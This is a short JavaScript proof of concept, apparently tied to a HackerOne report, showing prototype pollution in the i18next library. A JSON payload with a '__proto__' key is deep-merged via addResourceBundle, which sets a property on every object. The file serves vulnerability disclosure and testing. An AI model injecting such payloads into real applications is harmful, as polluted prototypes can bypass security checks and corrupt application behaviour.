// //https://hackerone.com/reports/968355#:~:text=It%20allows%20to%20set%20many,example%2C%20you%20can%20call%20i18next.&text=To%20pollute%20Object%20you%20could,polluted%3A%20true%20%7D%20%7D%20%7D%20.

const i18next = require("i18next");

  const translations =
    '{ "__proto__": { "polluted": "yes"} }';
  const existingData = {};
i18next.init({
  lng: "en",
  resources: {}
});
console.log({}.polluted);
  i18next.addResourceBundle(
  "en",
  "translation",
  JSON.parse(translations),
  true, // deep merge
  true  // overwrite
);

  //i18next.deepExtend(existingData, JSON.parse(translations), true);

console.log({}.polluted);
// });